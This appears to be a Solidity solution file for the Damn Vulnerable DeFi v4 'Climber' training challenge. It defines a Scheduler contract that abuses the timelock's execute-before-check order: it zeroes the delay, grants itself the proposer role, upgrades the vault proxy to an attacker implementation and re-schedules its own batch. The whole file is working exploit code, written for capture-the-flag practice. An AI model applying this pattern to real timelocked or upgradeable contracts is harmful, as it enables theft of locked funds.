// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IAccessControl} from "@openzeppelin/contracts/access/IAccessControl.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {Attacker} from "./Attacker.sol";

contract Scheduler {

    ClimberVault vault;
    ClimberTimelock timelock;
    Attacker attacker;

    constructor(ClimberVault _vault, ClimberTimelock _timelock, Attacker _attacker) {
        vault = _vault;
        timelock = _timelock;
        attacker = _attacker;
    }
    
    function schedule() external {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(vault);
        targets[3] = address(this);

        dataElements[0] = abi.encodeCall(ClimberTimelock.updateDelay, (0));
        dataElements[1] = abi.encodeCall(IAccessControl.grantRole, (PROPOSER_ROLE, address(this)));
        dataElements[2] = abi.encodeCall(UUPSUpgradeable.upgradeToAndCall, (address(attacker), ""));
        dataElements[3] = abi.encodeCall(Scheduler.schedule, ());
        
        timelock.schedule(targets, values, dataElements, 0);
    }
}